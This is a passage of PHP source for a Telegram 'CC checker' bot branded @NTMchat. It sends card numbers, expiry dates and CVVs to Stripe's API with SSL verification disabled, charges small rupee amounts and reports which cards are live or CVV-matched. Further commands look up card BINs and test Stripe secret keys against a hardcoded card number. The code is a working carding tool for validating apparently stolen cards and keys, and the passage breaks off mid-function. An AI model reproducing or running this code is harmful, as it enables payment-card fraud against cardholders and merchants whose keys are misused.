                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=【🅽🆃🅼】@NTMchat Mittal');
                $result1 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=inr&payment_method_types[]=card&description=【🅽🆃🅼】@NTMchat Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $msg2 = Getstr($result2,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
                if(strpos($result2, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Successfully Charged ₹$amt ✅</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Insufficient Funds</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  3D 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Payment Cannot Be Completed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ </b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  CVV MISSMATCH</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result1,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ </b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  CVV MISSMATCH</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Transaction Not Allowed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Fraudulent</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Expired 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Do Not Honor</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  SK IS AT RATE LIMIT</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                
                elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  𝘾𝙖𝙧𝙙 Number Is Incorrect</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                else {
                sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
                };
                }
        
        elseif ((strpos($message, "/cmds") === 0)||(strpos($message, "!cmds") === 0)||(strpos($message, "!command") === 0)||(strpos($message, "!commands") === 0)||(strpos($message, "/commands") === 0)||(strpos($message, "/command") === 0)||(strpos($message, "/cmd") === 0)){
        sendMessage($chatId, "<b>🅽🆃🅼 🅲🅲 🅲🅷🅺%0A%0A『 ★ 𝐆𝐀𝐓𝐄𝐒 ★ 』%0D%0A╔══════════════════════════%0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>$1</b> ➣ /usd or /chk %0A╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣ OFF❎%0A╟═══════════════════%0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>$5</b> ➣ /chk5%0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ OFF❎%0A╟═══════════════════ %0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 ₹𝟏𝟎𝟎 ➣ /inr %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 ₹𝟒𝟓 ➣ /inr45 %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣𝐁𝐈𝐍 𝐋𝐎𝐎𝐊𝐔𝐏 ➣ /bin %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════ %0A╟➣𝐒𝐊 𝐂𝐇𝐄𝐂𝐊 ➣ /sk %0A╟➣𝙎𝙩𝙖𝙩𝙪𝙨 ➣ ON✅%0A╟═══════════════════%0A╟➣Free Access【🅽🆃🅼】@NTMchat%0A╟═══════════════════%0A╟➣𝐁𝐨𝐭 𝐛𝐲 @abdul97233%0A╟═══════════════════ %0A╟➣𝐓𝐨 𝐤𝐧𝐨𝐰 𝐲𝐨𝐮𝐫 𝐢𝐝 ➣ /id%0A╚══════════════════════════</b>", $message_id);
        }
        
        //////////=========[Bin Command]=========//////////
        
        elseif ((strpos($message, "/bin") === 0)||(strpos($message, "!bin") === 0)||(strpos($message, ".bin") === 0)){
        $bin = substr($message, 5);
        if (!empty($bin)) {
        $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $info = curl_getinfo($ch);
        $time = $info['total_time'];
        $httpCode = $info['http_code'];
         $time = substr($time, 0, 4);
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        sendMessage($chatId, '<b>%0A╔═══════════════════%0A╟➣『 ★ VALID BIN ✅ ★ 』</b>%0A<b>╟➣ 𝗕𝗮𝗻𝗸➣ </b> '.$bank.'%0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣ </b> '.$name.''.$emoji.'%0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> '.$brand.'%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> '.$scheme.'%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣ </b> '.$type.'%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>'.$time.' s</b>╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @'.$username.'%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>', $message_id);
        }
else {
sendMessage($chatId, '<b>❌ Invalid Bin%0AFormat - /bin xxxxxx</b>', $message_id);
}
}
elseif (strpos($message, "/key") === 0){
$sec = substr($message, 5);
if (!empty($sec)) {
$skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
$result = curl_exec($ch);
$response = trim(strip_tags(GetStr($result,'"message": "','"')));
if (strpos($result, 'tok_')){
